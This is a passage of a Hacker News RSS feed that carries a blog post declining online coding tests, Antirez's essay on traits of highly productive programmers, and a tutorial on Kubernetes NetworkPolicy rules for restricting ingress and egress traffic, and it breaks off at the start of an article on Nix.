							<p>With nearly a decade of making apps professionally, Iâ€™ve been through all the ways recruiters use to evaluate candidates: Coding quizzes, peer programming sessions, writing tests, writing documentation, feature scoping, code audit, etc.</p><p>I have also been on the other side of the table a few times to evaluate new hires, so I understand the end game: Recruiters get lots of applications and they cannot afford to interview each one of the good ones. <br></p><p>As such the situation below was born:<br></p><blockquote><p><b>Companies are looking for a way to create a funnel, to <b>automatically</b> filter out&nbsp; the â€œbadâ€ fits. <br></b></p><p><b>And the simple way to do that came from academia i.e Grades.</b></p></blockquote><p>So Codility, Hacker Rank, Dev Skiller and co. were born out of this need.</p><p> But they focused so much on the end goal (<b>saving the company time by only allowing a few</b>) that they forgot about the actual evaluation. Programming tests are a good fit for people who are good at preparing for them. The college graduates or the people who have enough free time to practice weekly on those platforms.<br></p><p>I donâ€™t have the time to rehearse 
(or reverse) binary trees and take your test and ship a home assignment and do a technical interview. Specially since the real job doesnâ€™t include re implementing a sorting algorithms.<br></p><p><b><i>I have no issues with assignments and take home projects</i></b> because although I
 have <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fgithub.com%2Fahbou%2F&amp;t=NDEyYTViMGQ5YTc1MGMzMWY5MTU0NTVkMjI2MzFlNDFlNThiMDM5NixFUFZ0MldZaA%3D%3D&amp;b=t%3ApNqn9Es7-Uwh3xaGTNcJRQ&amp;p=https%3A%2F%2Fahbou.org%2Fpost%2F635229336295899136%2Fsorry-i-wont-take-your-online-coding-quiz&amp;m=1&amp;ts=1606048155" target="_blank">code available publicly </a>it might not be recent enough. So a small project is a good way to evaluate a candidateâ€™s thinking, architectural choices and coding style if the said project is either paid or takes a couple of hours to finish.<br></p><p>Anyway, Iâ€™ve decided I will not take any programming tests anymore.<br></p>
							
							
							
						

						

						

						

						

						

						

						

						

						
							
						
					</article> <!-- /post -->			
				
  				

				
				
				
							
			</section> <!-- /posts -->
		</div></div>]]>
            </description>
            <link>https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150836</guid>
            <pubDate>Thu, 19 Nov 2020 16:05:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The mythical 10x programmer by Antirez]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25150827">thread link</a>) | @pietroppeter
<br/>
November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe Iâ€™m a very fast programmer. Considering Iâ€™m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmersâ€™ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you canâ€™t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental â€œproofs of conceptâ€ so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, itâ€™s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call â€œopportunistic programming.â€ Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>
<p>
At <a href="https://intelligenthack.com/en" alt="Intelligent Hack" title="Intelligent Hack">Intelligent Hack</a> we are expert in affecting cultural change in development companies that want to modernize their approach to development or improve so they can scale.
We are also able to help you implement agile methodologies, better software architecture, and scaling legacy software so you can concentrate on maximizing growth for your company instead of worrying about how to support it.
Feel free to contact us if you want to have a chat at <a href="https://sklivvz.com/cdn-cgi/l/email-protection" data-cfemail="7d15143d141309181111141a181309151c1e16531e121053">[email&nbsp;protected]</a>
</p>
</div></div>]]>
            </description>
            <link>https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150827</guid>
            <pubDate>Thu, 19 Nov 2020 16:04:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securing Kubernetes: Using Network Policies to Control Traffic in Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150576">thread link</a>) | @jornjambers
<br/>
November 19, 2020 | https://in4it.io/2020/11/18/using-network-policies-to-control-traffic-in-kubernetes/ | <a href="https://web.archive.org/web/*/https://in4it.io/2020/11/18/using-network-policies-to-control-traffic-in-kubernetes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>This is the first part of our â€œKubernetes Security Seriesâ€. In this part Iâ€™m going to explain how Network Policies can help you secure your network traffic within your Kubernetes cluster.</p>



<h2>Filtering network traffic</h2>



<p>First of all, you need to think about what kind of network traffic you want to filter. The easiest way filtering traffic is on Layer 3 and 4, which is at the IP address and port level. If youâ€™d like to filter on http/https hostname, then youâ€™ll need Layer 7 filtering, which is currently not supported by Kubernetes Network Policies. For that, you would need a separate proxy server within your cluster.</p>



<p>On Layer 3 and 4 filtering, if youâ€™d like to filter traffic to github.com, youâ€™d filter based on the IP address and port 80/443 (http/https). If github.com changes IP address, youâ€™d have to change your Network Policy rules. If youâ€™re capable of doing Layer 7 filtering, then you could examine the hostname that passes port 80/443, and only filter if the hostname matches github.com. A sidenote: even on port 443 using https, if SNI (Server Name Indication) is used, then the hostname is passed unencrypted. SNI is currently widely used.</p>



<p>Weâ€™ll keep Layer 7 filtering for another blog post, as this is currently much more complicated, because you cannot use Network Policies for that. You would need an ingress/egress proxy that understands Layer 7 (http/https) traffic, like Envoy proxy. More traditional reverse proxies like haproxy/nginx could also be used for this.</p>



<h2>The Network Policy</h2>



<p>Letâ€™s talk about the Network Policy itself! The NetworkPolicy resource in Kubernetes allows you to manage Layer 3 and 4 traffic on a pod level. The <a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">NetworkPolicy documentation</a> specifies 3 combinations you can use to manage traffic:</p>



<ol><li>Pod-to-pod traffic by identifying the pod using selectors (for example using pod labels)</li><li>Traffic rules based on Namespace (for example pod from namespace 1 can access all pods in namespace 2)</li><li>Rules based on IP blocks (taking into account that traffic to and from the node that the pod is running on is always allowed)</li></ol>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/in4it.io\/2020\/11\/18\/using-network-policies-to-control-traffic-in-kubernetes\/&quot;}"><li><figure><img data-attachment-id="6459" data-permalink="https://in4it.io/3-types-2-2/" data-orig-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?fit=2821%2C1197&amp;ssl=1" data-orig-size="2821,1197" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3-types-2" data-image-description="" data-medium-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?fit=300%2C127&amp;ssl=1" data-large-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?fit=525%2C223&amp;ssl=1" loading="lazy" width="525" height="223" src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=525%2C223&amp;ssl=1" alt="" data-id="6459" srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?w=2821&amp;ssl=1 2821w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=300%2C127&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1024%2C435&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=768%2C326&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1536%2C652&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=2048%2C869&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1200%2C509&amp;ssl=1 1200w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?w=2821&amp;ssl=1 2821w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=300%2C127&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1024%2C435&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=768%2C326&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1536%2C652&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=2048%2C869&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1200%2C509&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=525%2C223&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul></figure>



<h2>Secure network traffic</h2>



<p>To secure your network traffic, you will need to disable the default behavior to allow all ingress and egress traffic. To make this easier, you can first disable ingress traffic, figure out what rules you need to make your pods working again, and then start with egress traffic restrictions. Itâ€™s going to be much more difficult to figure out egress traffic rules than ingress traffic, as itâ€™s often not obvious what external traffic your applications will initiate.</p>



<p>A Network Policy to deny all traffic by default will look like this:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: default-deny-all
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- Ingress
&nbsp;&nbsp;- Egress</code></pre>



<p>This rule will match all pods (podSelector: {}), and will deny ingress/egress traffic, if no other rule is in place to allow traffic.</p>



<h2>Ingress traffic</h2>



<p>Allowing ingress is the easiest to do if you have a single point of entry. This is the case if youâ€™re using an ingress controller. You then only need to ensure access to the ingress controller, and from the ingress controller to the backend pods. Here is an example of such a NetworkPolicy:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-access
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cidr: 192.168.1.0/24
---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-to-backends
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ingress: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx</code></pre>



<p>There are 2 rules here. The first rule, called â€œingress-accessâ€ will be applicable on pods that have the label app.kubernetes.io/name=ingress-nginx. Pods that match will allow traffic from 192.168.1.0/24. This IP range could be your local IP range if youâ€™re using minikube, or a Virtual Private Cloud network range on cloud providers. In those ranges you typically run the LoadBalancer which needs access to the ingress controller. If youâ€™re not using a cloud Load Balancer, then it can even be 0.0.0.0/0 in case you want to let everyone access your ingress controller.<br></p>



<p>Once traffic hits the ingress controller, itâ€™ll proxy the requests to the backend services. We need to allow traffic between this ingress controller and the backend services, which can be done using the second NetworkPolicy, in our example â€œingress-to-backendsâ€. This rule matches the pods with the label â€œapp=myappâ€. You can make this a more generic label that you assign to all your backend pods. These pods need to allow traffic from the ingress controller, so we specify an â€œingressâ€ rule with â€œfromâ€ to match the namespace (ingress=true) and the pod with the label â€œapp.kubernetes.io/name=ingress-nginx). Make sure to label the namespace where your ingress controller is running in to make this work. The end result should be something like this:</p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/in4it.io\/2020\/11\/18\/using-network-policies-to-control-traffic-in-kubernetes\/&quot;}"><li><figure><img data-attachment-id="6460" data-permalink="https://in4it.io/ingress-2/" data-orig-file="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?fit=2895%2C956&amp;ssl=1" data-orig-size="2895,956" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ingress" data-image-description="" data-medium-file="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?fit=300%2C99&amp;ssl=1" data-large-file="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?fit=525%2C173&amp;ssl=1" loading="lazy" width="525" height="173" src="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=525%2C173&amp;ssl=1" alt="" data-id="6460" srcset="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?w=2895&amp;ssl=1 2895w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=300%2C99&amp;ssl=1 300w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1024%2C338&amp;ssl=1 1024w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=768%2C254&amp;ssl=1 768w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1536%2C507&amp;ssl=1 1536w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=2048%2C676&amp;ssl=1 2048w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1200%2C396&amp;ssl=1 1200w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?w=2895&amp;ssl=1 2895w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=300%2C99&amp;ssl=1 300w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1024%2C338&amp;ssl=1 1024w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=768%2C254&amp;ssl=1 768w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1536%2C507&amp;ssl=1 1536w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=2048%2C676&amp;ssl=1 2048w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1200%2C396&amp;ssl=1 1200w" data-lazy-src="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=525%2C173&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>ingress traffic flow</figcaption></figure></li></ul></figure>



<h2>Egress traffic</h2>



<p>Traffic originating from a pod will be controlled by the egress NetworkPolicy rules. The typical application will need to do DNS lookups (translating for example google.com to an IP address) before making a request to an external server. The DNS server typically runs within the Kubernetes cluster, so thatâ€™ll be the first rule you need when blocking all egress traffic. Below is an example of such a rule that blocks all egress traffic, but allows DNS traffic to the DNS pods running in the kube-system namespace (kube-system needs to be labelled with kube-dns: â€œtrueâ€):</p>



<pre><code><strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: deny-egress-allow-dns
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- <strong>Egress</strong>
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kube-dns: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;k8s-app: kube-dns
&nbsp;&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: UDP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53</code></pre>



<p>Once this Network Policy is in place, youâ€™ll need to make sure you have an egress rule for every outgoing connection that any pod in the Kubernetes cluster can make. If an application uses for example an external API for transactional emails, or connects to external cloud services, then youâ€™ll need a Network Policy covering this.</p>



<p>Most cloud services will have a list of IP addresses and IP ranges, which you can use to whitelist egress traffic. It can definitely be a long process to get it right if you have a lot of external dependencies. Once you deny all egress traffic by default, youâ€™ll need to do some testing to trigger all the external endpoints and test whether they still work.</p>



<p>Below is an example rule to allow https (port 443) traffic to a specific IP address.</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;name: egress-access-myapp
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>cidr</strong>: 1.1.1.1/32
&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 443</code></pre>



<p>After applying this NetworkPolicy, the pod with the label app=myapp will be able to access hostnames that resolve to the IP address 1.1.1.1 (a CloudFlare IP) on port 443. This diagram summarizes our setup after applying both Network Policies:</p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/in4it.io\/2020\/11\/18\/using-network-policies-to-control-traffic-in-kubernetes\/&quot;}"><li><figure><img data-attachment-id="6461" data-permalink="https://in4it.io/egress-2/" data-orig-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?fit=2308%2C1203&amp;ssl=1" data-orig-size="2308,1203" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="egress" data-image-description="" data-medium-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?fit=300%2C156&amp;ssl=1" data-large-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?fit=525%2C274&amp;ssl=1" loading="lazy" width="525" height="274" src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=525%2C274&amp;ssl=1" alt="" data-id="6461" srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?w=2308&amp;ssl=1 2308w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=300%2C156&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1024%2C534&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=768%2C400&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1536%2C801&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=2048%2C1067&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1200%2C625&amp;ssl=1 1200w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?w=2308&amp;ssl=1 2308w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=300%2C156&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1024%2C534&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=768%2C400&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1536%2C801&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=2048%2C1067&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1200%2C625&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=525%2C274&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>egress traffic flow</figcaption></figure></li></ul></figure>



<p>This article shows you how to filter Layer 3 and 4 traffic using NetworkPolicies. Unfortunately at the time of writing, thereâ€™s no Layer 7 support in NetworkPolicies. To filter on http/https hostname or other protocols, we would need to redirect all the traffic through an egress proxy/gateway â€“ which weâ€™ll explain in another blog post!</p>
			</div></div>]]>
            </description>
            <link>https://in4it.io/2020/11/18/using-network-policies-to-control-traffic-in-kubernetes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150576</guid>
            <pubDate>Thu, 19 Nov 2020 15:39:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On-demand linked libraries for Nix]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150572">thread link</a>) | @fanf2
<br/>
November 19, 2020 | https://fzakaria.com/2020/11/17/on-demand-linked-libraries-for-nix.html | <a href="https://web.archive.org/web/*/https://fzakaria.com/2020/11/17/on-demand-linked-libraries-for-nix.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <blockquote>
